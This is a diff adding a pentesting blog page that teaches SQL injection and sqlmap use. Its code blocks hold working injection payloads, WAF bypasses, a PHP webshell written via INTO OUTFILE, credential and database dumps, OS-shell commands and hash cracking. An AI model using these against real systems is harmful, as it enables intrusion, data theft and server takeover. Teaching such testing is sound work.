@@ -1,0 +1,1091 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="view-transition" content="same-origin">
+  <title>SQL Injection &amp; sqlmap – From Manual Payloads to Full Dumps — Axiom</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <script src="/axiom-blog-site/static/js/theme.js?v=1"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/style.css?v=37">
+  <link rel="stylesheet" href="/axiom-blog-site/cats.css">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/hljs.min.css?v=2">
+  <link rel="alternate" type="application/atom+xml" title="Axiom" href="/axiom-blog-site/feed.xml">
+  
+  
+  <script type="application/json" id="crypto-config">{"iterations": 200000, "salt": "Hs5vGSmGG9SrSvdivb1KMQ==", "validator": {"ciphertext": "qc5l/aTsWWRNo4f5E4/mEvP5on0aI+iozmsqvajrAwNS", "iv": "HdtYEOAFH1dyaFcb"}}</script>
+
+</head>
+<body class="cat-context-tools">
+  <header class="site-header">
+    <div class="container">
+      <a href="/axiom-blog-site/" class="site-brand">
+        <span class="brand-name">Axiom</span>
+      </a>
+      <nav class="site-nav">
+        
+  <a href="/axiom-blog-site/" class="nav-back">
+    <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor">
+      <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
+    </svg>
+    All posts
+  </a>
+
+        <button class="search-trigger" id="themeToggle" aria-label="Toggle theme" title="Toggle theme">
+          <svg class="icon-sun" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="4"/>
+            <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/>
+          </svg>
+          <svg class="icon-moon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+          </svg>
+        </button>
+        <button class="search-trigger" id="searchTrigger" aria-label="Search posts" title="Search">
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+          </svg>
+        </button>
+      </nav>
+    </div>
+  </header>
+
+  
+  <div class="search-overlay" id="searchOverlay" aria-hidden="true" role="dialog" aria-modal="true" aria-label="Search">
+    <div class="search-backdrop" id="searchBackdrop"></div>
+    <div class="search-panel">
+      <div class="search-input-wrap">
+        <svg class="search-icon-inner" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+        </svg>
+        <input class="search-input" id="searchInput"
+               type="search"
+               placeholder="Search titles, tags, content…"
+               autocomplete="off"
+               spellcheck="false"
+               maxlength="100"
+               aria-label="Search posts">
+        <button class="search-close" id="searchClose" aria-label="Close search">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
+            <path d="M18 6 6 18M6 6l12 12"/>
+          </svg>
+        </button>
+      </div>
+      <div class="search-results" id="searchResults" role="listbox" aria-live="polite"></div>
+    </div>
+  </div>
+
+  
+  <div class="modal-backdrop" id="shortcutsModalBackdrop" hidden>
+    <div class="modal" id="shortcutsModal" role="dialog" aria-modal="true" aria-labelledby="shortcutsTitle">
+      <div class="modal-header">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <rect x="2" y="6" width="20" height="12" rx="2"/>
+            <path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h12"/>
+          </svg>
+        </div>
+        <div>
+          <h2 class="modal-title" id="shortcutsTitle">Keyboard Shortcuts</h2>
+          <p class="modal-subtitle">Navigate this site faster.</p>
+        </div>
+      </div>
+      <div class="modal-body">
+        <div class="shortcuts-list">
+          <div class="shortcuts-row">
+            <span>Open search</span>
+            <span class="shortcuts-keys"><span class="key">/</span><span class="key">s</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Close dialog</span>
+            <span class="shortcuts-keys"><span class="key">Esc</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Go home</span>
+            <span class="shortcuts-keys"><span class="key">g</span><span class="key">h</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Show this help</span>
+            <span class="shortcuts-keys"><span class="key">?</span></span>
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-ghost" id="shortcutsClose">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <main class="site-main">
+    <div class="container">
+      
+
+<div id="readingProgress" hidden></div>
+
+<article class="post-article has-toc cat-context-tools">
+
+  <div class="post-main">
+
+  <header class="post-header">
+    <h1 class="post-title">SQL Injection &amp; sqlmap – From Manual Payloads to Full Dumps</h1>
+    <div class="post-meta">
+      <time>2026-06-03</time>
+      
+        <span class="meta-sep">·</span>
+        <span class="reading-time">1 min read</span>
+      
+      
+        <span class="meta-sep">·</span>
+        <a href="/axiom-blog-site/cat/tools/" class="cat-badge cat-badge-link cat-tools">Tools</a>
+      
+      
+        <span class="meta-sep">·</span>
+        <span class="tag-list">
+          
+            <span class="tag">sql</span>
+          
+            <span class="tag">sqli</span>
+          
+            <span class="tag">sqlmap</span>
+          
+            <span class="tag">web</span>
+          
+            <span class="tag">pentesting</span>
+          
+        </span>
+      
+    </div>
+    
+      <p class="post-summary">SQL injection is one of the most impactful web vulnerabilities. Learn manual detection and exploitation techniques, then automate the heavy lifting with sqlmap — from basic dumps to OS shell access.</p>
+    
+  </header>
+
+  
+  
+
+
+  <div class="post-body">
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">01</span>
+            <span class="heading-text">What is SQL Injection?</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>SQL Injection (SQLi)</strong> occurs when user-supplied input is inserted into a SQL query without proper sanitisation. An attacker can alter the query logic to bypass authentication, extract data, write files, or execute OS commands.</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Type</th><th>How it works</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>**In-band / UNION**</td><td>Results returned directly in the HTTP response</td>
+                </tr>
+              
+                <tr>
+                  <td>**Error-based**</td><td>DB error messages leak data</td>
+                </tr>
+              
+                <tr>
+                  <td>**Boolean blind**</td><td>True/false conditions change page behaviour</td>
+                </tr>
+              
+                <tr>
+                  <td>**Time-based blind**</td><td>`SLEEP()` delays confirm injection</td>
+                </tr>
+              
+                <tr>
+                  <td>**Out-of-band**</td><td>Data exfiltrated via DNS/HTTP (needs outbound access)</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">02</span>
+            <span class="heading-text">Detection – Finding the Injection Point</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Start simple — break the query, then confirm control.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">sql</span>
+            
+          </div>
+          <pre><code class="language-sql">-- Single quote: causes a DB error if vulnerable
+&#39;
+
+-- Comment out the rest of the query
+&#39; --
+&#39; -- -
+&#39;#         (MySQL)
+
+-- Always-true condition: returns all rows
+&#39; OR &#39;1&#39;=&#39;1
+&#39; OR 1=1 --
+1&#39; OR &#39;1&#39;=&#39;1&#39; --
+
+-- Always-false: returns zero rows (page differs from always-true)
+&#39; AND &#39;1&#39;=&#39;2
+
+-- Arithmetic check: if 1+1=2 response equals normal, injection exists
+1+1         → compare with 2 response
+
+-- Time-based blind confirmation
+&#39; AND SLEEP(5) --          (MySQL)
+&#39;; WAITFOR DELAY &#39;0:0:5&#39;-- (MSSQL)
+&#39; AND pg_sleep(5) --       (PostgreSQL)</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">03</span>
+            <span class="heading-text">Manual UNION-Based Injection</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>UNION injection appends a second <code>SELECT</code> to the original query and returns data in the normal response. You need to know the <strong>number of columns</strong> and <strong>data types</strong> first.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">sql</span>
+            
+          </div>
+          <pre><code class="language-sql">-- Step 1: Find column count with ORDER BY
+&#39; ORDER BY 1 --
+&#39; ORDER BY 2 --
+&#39; ORDER BY 3 --    ← error here means 2 columns
+
+-- Alternative: NULL probing
+&#39; UNION SELECT NULL --
+&#39; UNION SELECT NULL,NULL --
+&#39; UNION SELECT NULL,NULL,NULL --
+
+-- Step 2: Find which column is visible in the page
+&#39; UNION SELECT &#39;a&#39;,NULL,NULL --
+&#39; UNION SELECT NULL,&#39;a&#39;,NULL --
+&#39; UNION SELECT NULL,NULL,&#39;a&#39; --
+
+-- Step 3: Extract data (MySQL example, 3 columns, col 2 is visible)
+&#39; UNION SELECT NULL,database(),NULL --           -- current DB name
+&#39; UNION SELECT NULL,user(),NULL --               -- current DB user
+&#39; UNION SELECT NULL,@@version,NULL --            -- DB version
+
+-- Step 4: List all databases
+&#39; UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata --
+
+-- Step 5: List tables in a database
+&#39; UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=&#39;target_db&#39; --
+
+-- Step 6: List columns in a table
+&#39; UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name=&#39;users&#39; --
+
+-- Step 7: Dump the data
+&#39; UNION SELECT NULL,concat(username,&#39;:&#39;,password),NULL FROM users --</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">04</span>
+            <span class="heading-text">Boolean Blind Injection</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>No data in the response — only a difference between <strong>true</strong> and <strong>false</strong> (content changes, element appears/disappears, redirect vs no redirect).</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">sql</span>
+            
+          </div>
+          <pre><code class="language-sql">-- Confirm: true vs false gives different page
+&#39; AND 1=1 --    ← normal page
+&#39; AND 1=2 --    ← different / empty page
+
+-- Extract DB name character by character
+&#39; AND substring(database(),1,1)=&#39;a&#39; --
+&#39; AND substring(database(),1,1)=&#39;b&#39; --
+-- ... until page returns true
+
+-- Binary search with ASCII (faster)
+&#39; AND ascii(substring(database(),1,1)) &gt; 109 --
+&#39; AND ascii(substring(database(),1,1)) &gt; 115 --
+-- Narrows to exact char in ~7 requests per character</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">05</span>
+            <span class="heading-text">File Read / Write (MySQL)</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">sql</span>
+            
+          </div>
+          <pre><code class="language-sql">-- Read a file (requires FILE privilege)
+&#39; UNION SELECT NULL,LOAD_FILE(&#39;/etc/passwd&#39;),NULL --
+&#39; UNION SELECT NULL,LOAD_FILE(&#39;/var/www/html/config.php&#39;),NULL --
+
+-- Write a webshell (requires write permission on web root)
+&#39; UNION SELECT NULL,&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;,NULL
+  INTO OUTFILE &#39;/var/www/html/shell.php&#39; --
+
+-- Then access:
+-- http://target.com/shell.php?cmd=id</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">06</span>
+            <span class="heading-text">Common Bypasses</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">sql</span>
+            
+          </div>
+          <pre><code class="language-sql">-- WAF / filter bypasses
+SELeCT          -- mixed case (some filters are case-sensitive)
+SEL/**/ECT      -- inline comments to break keywords
+SELECT%09       -- tab instead of space (%09)
+/*!SELECT*/     -- MySQL version comment
+
+-- Quote bypass with hex encoding
+-- Instead of: WHERE username=&#39;admin&#39;
+-- Use:        WHERE username=0x61646d696e
+
+-- Space bypass
+SELECT/**/username/**/FROM/**/users
+
+-- Double encoding
+%2527  →  %27  →  &#39;
+
+-- Second-order injection: stored then re-used
+-- Register username: admin&#39;--
+-- Used later in: SELECT * FROM users WHERE username=&#39;admin&#39;--&#39;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">07</span>
+            <span class="heading-text">sqlmap – Automated SQLi</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><code>sqlmap</code> automates detection and exploitation across all injection types and databases. It handles enumeration, dumping, and even OS-level access.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">08</span>
+            <span class="heading-text">sqlmap – Basic Usage</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Test a URL parameter
+sqlmap -u &#39;http://target.com/item?id=1&#39;
+
+# Specify the parameter explicitly
+sqlmap -u &#39;http://target.com/item?id=1&amp;cat=2&#39; -p id
+
+# POST request
+sqlmap -u &#39;http://target.com/login&#39; --data=&#39;user=admin&amp;pass=test&#39;
+
+# Load request from Burp/file (most reliable for complex requests)
+sqlmap -r request.txt
+
+# HTTPS
+sqlmap -u &#39;https://target.com/item?id=1&#39; --batch</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">09</span>
+            <span class="heading-text">sqlmap – Authentication &amp; Sessions</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Cookie-based session (authenticated scan)
+sqlmap -u &#39;http://target.com/profile?id=1&#39; --cookie=&#39;PHPSESSID=abc123; session=xyz&#39;
+
+# HTTP Basic Auth
+sqlmap -u &#39;http://target.com/admin?id=1&#39; --auth-type=basic --auth-cred=&#39;admin:password&#39;
+
+# Custom header injection (e.g. X-Forwarded-For)
+sqlmap -u &#39;http://target.com/&#39; --header=&#39;X-Forwarded-For: 1*&#39;
+
+# User agent injection
+sqlmap -u &#39;http://target.com/&#39; --user-agent=&#39;Mozilla* &#39;
+
+# Follow redirects
+sqlmap -u &#39;http://target.com/item?id=1&#39; --follow-redirects</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">10</span>
+            <span class="heading-text">sqlmap – Enumeration Flags</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Get current database name
+sqlmap -u &#39;http://target.com/item?id=1&#39; --current-db
+
+# Get current user
+sqlmap -u &#39;http://target.com/item?id=1&#39; --current-user
+
+# Check if user is DBA
+sqlmap -u &#39;http://target.com/item?id=1&#39; --is-dba
+
+# List all databases
+sqlmap -u &#39;http://target.com/item?id=1&#39; --dbs
+
+# List tables in a database
+sqlmap -u &#39;http://target.com/item?id=1&#39; -D target_db --tables
+
+# List columns in a table
+sqlmap -u &#39;http://target.com/item?id=1&#39; -D target_db -T users --columns
+
+# Dump a table
+sqlmap -u &#39;http://target.com/item?id=1&#39; -D target_db -T users --dump
+
+# Dump specific columns
+sqlmap -u &#39;http://target.com/item?id=1&#39; -D target_db -T users -C username,password --dump
+
+# Dump everything (slow on large DBs)
+sqlmap -u &#39;http://target.com/item?id=1&#39; --dump-all</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">11</span>
+            <span class="heading-text">sqlmap – Tuning &amp; Speed</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Risk and level (1-5 each; higher = more aggressive/dangerous tests)
+sqlmap -u &#39;http://target.com/item?id=1&#39; --level=3 --risk=2
+
+# Force specific DB type (skip detection)
+sqlmap -u &#39;http://target.com/item?id=1&#39; --dbms=mysql
+sqlmap -u &#39;http://target.com/item?id=1&#39; --dbms=mssql
+sqlmap -u &#39;http://target.com/item?id=1&#39; --dbms=postgresql
+
+# Force injection technique
+sqlmap -u &#39;http://target.com/item?id=1&#39; --technique=U    # UNION only
+sqlmap -u &#39;http://target.com/item?id=1&#39; --technique=BT   # Boolean + Time-based
+sqlmap -u &#39;http://target.com/item?id=1&#39; --technique=BEUSTQ  # All
+
+# Set number of threads
+sqlmap -u &#39;http://target.com/item?id=1&#39; --threads=5
+
+# Skip confirmation prompts (use defaults)
+sqlmap -u &#39;http://target.com/item?id=1&#39; --batch
+
+# Use a proxy (e.g. Burp)
+sqlmap -u &#39;http://target.com/item?id=1&#39; --proxy=&#39;http://127.0.0.1:8080&#39;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">12</span>
+            <span class="heading-text">sqlmap – WAF Bypass</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Use a tamper script
+sqlmap -u &#39;http://target.com/item?id=1&#39; --tamper=space2comment
+sqlmap -u &#39;http://target.com/item?id=1&#39; --tamper=randomcase
+sqlmap -u &#39;http://target.com/item?id=1&#39; --tamper=between,randomcase,space2comment
+
+# Common tamper scripts:
+# space2comment    -- spaces → /**/ 
+# randomcase       -- SeLeCt RaNdOm CaSe
+# between          -- &gt; → NOT BETWEEN 0 AND
+# charencode       -- URL encode chars
+# base64encode     -- base64 encode payload
+# equaltolike      -- = → LIKE
+# modsecurityversioned -- version comments for MySQL
+
+# List all available tampers
+sqlmap --list-tampers
+
+# Random user agent to avoid signature detection
+sqlmap -u &#39;http://target.com/item?id=1&#39; --random-agent
+
+# Add delay between requests
+sqlmap -u &#39;http://target.com/item?id=1&#39; --delay=1</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">13</span>
+            <span class="heading-text">sqlmap – OS &amp; Shell Access</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Read a file from the server
+sqlmap -u &#39;http://target.com/item?id=1&#39; --file-read=&#39;/etc/passwd&#39;
+sqlmap -u &#39;http://target.com/item?id=1&#39; --file-read=&#39;C:/Windows/win.ini&#39;
+
+# Write a file to the server
+sqlmap -u &#39;http://target.com/item?id=1&#39; \
+  --file-write=&#39;./shell.php&#39; --file-dest=&#39;/var/www/html/shell.php&#39;
+
+# Interactive OS shell (via INTO OUTFILE webshell or xp_cmdshell)
+sqlmap -u &#39;http://target.com/item?id=1&#39; --os-shell
+
+# Interactive SQL shell
+sqlmap -u &#39;http://target.com/item?id=1&#39; --sql-shell
+
+# Enable xp_cmdshell on MSSQL
+sqlmap -u &#39;http://target.com/item?id=1&#39; --os-pwn   # Meterpreter / VNC</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">14</span>
+            <span class="heading-text">Using a Burp Request File</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The most reliable way to use sqlmap on complex requests (with tokens, custom headers, JSON bodies) is to capture the request in Burp and save it.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># request.txt (copied from Burp &#34;Copy to file&#34; or &#34;Save item&#34;)
+# GET /item?id=1 HTTP/1.1
+# Host: target.com
+# Cookie: session=abc123
+# ...
+
+sqlmap -r request.txt --batch --level=3
+
+# Mark the injection point explicitly with *
+# GET /item?id=1* HTTP/1.1
+sqlmap -r request.txt -p id
+
+# For JSON bodies, sqlmap auto-detects -- or mark with *
+# {&#34;id&#34;: &#34;1*&#34;}</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">15</span>
+            <span class="heading-text">Real-World Use Cases</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Bug Bounty / Web Application Testing</strong><br>
+- Test every user-controlled input: GET/POST parameters, cookies, HTTP headers (<code>User-Agent</code>, <code>X-Forwarded-For</code>, <code>Referer</code>), JSON/XML bodies<br>
+- After confirming SQLi, use <code>--current-user --is-dba</code> to assess impact before going further<br>
+- <code>--file-read</code> on config files (<code>config.php</code>, <code>web.config</code>, <code>.env</code>) often yields DB credentials, API keys, or secrets<br>
+- Always scan with <code>--batch</code> and save a full log with <code>--output-dir</code> for report evidence</p></div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Penetration Testing</strong><br>
+- MSSQL with DBA rights: <code>--os-shell</code> via <code>xp_cmdshell</code> gives direct command execution<br>
+- MySQL: <code>LOAD_FILE</code> + <code>INTO OUTFILE</code> for reading configs and dropping webshells<br>
+- Credential harvesting: dump <code>users</code> tables and crack hashes offline with hashcat<br>
+- Pivot: leaked DB credentials frequently reused on SSH, admin panels, VPNs</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">16</span>
+            <span class="heading-text">CTF / HTB Workflow</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Step 1: Quick manual check -- does &#39; cause an error?
+curl -s &#39;http://&lt;target&gt;/item?id=1&#39;
+curl -s &#34;http://&lt;target&gt;/item?id=1&#39;&#34;
+
+# Step 2: Confirm with sqlmap
+sqlmap -u &#39;http://&lt;target&gt;/item?id=1&#39; --batch --level=2
+
+# Step 3: Enumerate
+sqlmap -u &#39;http://&lt;target&gt;/item?id=1&#39; --batch --current-db --dbs
+
+# Step 4: Dump users table
+sqlmap -u &#39;http://&lt;target&gt;/item?id=1&#39; --batch \
+  -D &lt;dbname&gt; -T users --dump
+
+# Step 5: If hashes found -- crack them
+hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt    # MD5
+hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt # bcrypt
+
+# Step 6: Check for file read (common flag location)
+sqlmap -u &#39;http://&lt;target&gt;/item?id=1&#39; --batch \
+  --file-read=&#39;/var/www/html/config.php&#39;
+
+# Step 7: If DBA and MySQL -- try webshell
+sqlmap -u &#39;http://&lt;target&gt;/item?id=1&#39; --batch --os-shell</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-note-block note-tip">
+          
+            <div class="note-label">
+              
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18h6"/><path d="M10 22h4"/><path d="M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.46.45.97 1.36 1.41 2.5"/></svg>
+              
+              <span>CTF Tips:</span>
+            </div>
+          
+          <div class="note-body"><ul>
+<li>Check cookies, <code>User-Agent</code>, <code>Referer</code>, and <code>X-Forwarded-For</code> headers — blind SQLi in headers is a common HTB trick</li>
+<li>Login forms: try <code>admin' -- -</code> as username with any password to bypass authentication manually</li>
+<li>If <code>--dump</code> is slow, use <code>--where</code> to limit rows: <code>--where="username='admin'"</code></li>
+<li>Second-order injection: register a malicious username, trigger it on a profile/settings page</li>
+<li>Look for <code>flag</code> or <code>secret</code> tables: <code>sqlmap ... --tables</code> then grep output for juicy names</li>
+<li>UNION payloads blocked? Try <code>--technique=T</code> (time-based blind) — slower but works around many filters</li>
+</ul></div>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">17</span>
+            <span class="heading-text">Quick Reference</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-note-block note-info">
+          
+            <div class="note-label">
+              
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
+              
+              <span>Info</span>
+            </div>
+          
+          <div class="note-body"><p><strong>Manual detection checklist:</strong> <code>'</code>  →  <code>' OR 1=1 --</code>  →  <code>' AND SLEEP(5) --</code></p>
+<p><strong>sqlmap core flags:</strong><br>
+- <code>-u</code> URL | <code>-r</code> request file | <code>-p</code> parameter | <code>--data</code> POST body<br>
+- <code>--cookie</code> session | <code>--header</code> custom header | <code>--random-agent</code><br>
+- <code>--dbs</code> list DBs | <code>-D</code> select DB | <code>--tables</code> | <code>-T</code> select table<br>
+- <code>--columns</code> | <code>-C</code> select cols | <code>--dump</code> | <code>--dump-all</code><br>
+- <code>--current-db</code> | <code>--current-user</code> | <code>--is-dba</code><br>
+- <code>--level</code> 1–5 | <code>--risk</code> 1–3 | <code>--technique</code> BEUSTQ<br>
+- <code>--dbms</code> force engine | <code>--batch</code> no prompts | <code>--threads</code><br>
+- <code>--tamper</code> WAF bypass | <code>--proxy</code> Burp | <code>--delay</code><br>
+- <code>--os-shell</code> OS cmd | <code>--sql-shell</code> SQL cmd<br>
+- <code>--file-read</code> read file | <code>--file-write</code> + <code>--file-dest</code> write file</p>
+<p><strong>Quick one-liner dump:</strong><br>
+<code>sqlmap -r req.txt --batch --level=3 --dbs &amp;&amp; sqlmap -r req.txt --batch -D target -T users --dump</code></p></div>
+        </div>
+
+      
+    
+  </div>
+
+  
+  
+
+
+  </div>
+
+  <nav id="tocBar" class="toc-bar" hidden></nav>
+
+</article>
+
+<button id="backToTop" hidden aria-label="Back to top">
+  <svg class="bt-ring" width="40" height="40" viewBox="0 0 40 40" aria-hidden="true">
+    <circle class="bt-ring-bg" cx="20" cy="20" r="17" fill="none" stroke-width="2"/>
+    <circle class="bt-ring-fg" cx="20" cy="20" r="17" fill="none" stroke-width="2"
+            stroke-dasharray="106.8" stroke-dashoffset="106.8"/>
+  </svg>
+  <svg class="bt-arrow" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="M12 19V5M5 12l7-7 7 7"/>
+  </svg>
+</button>
+
+
+
+
+<section class="related-posts">
+  <div class="section-header">
+    <span class="section-label">// related</span>
+    <span class="section-line"></span>
+  </div>
+  <div class="related-grid">
+    
+      
+      <a href="/axiom-blog-site/post/ffuf-gobuster-guide" class="post-card post-card-related card-cat-tools">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-tools">Tools</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">ffuf &amp; Gobuster – Web Fuzzing &amp; Directory Enumeration</h2>
+          <div class="post-card-meta"><time>2026-06-03</time></div>
+          <p class="post-card-summary">ffuf and Gobuster are the go-to tools for discovering hidden directories, subdomains, virtual hosts, and parameters. Learn their flags, filtering tricks, and the right tool for each job.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/burp-suite-guide" class="post-card post-card-related card-cat-tools">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-tools">Tools</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">Burp Suite — Web Application Pentesting</h2>
+          <div class="post-card-meta"><time>2026-06-04</time></div>
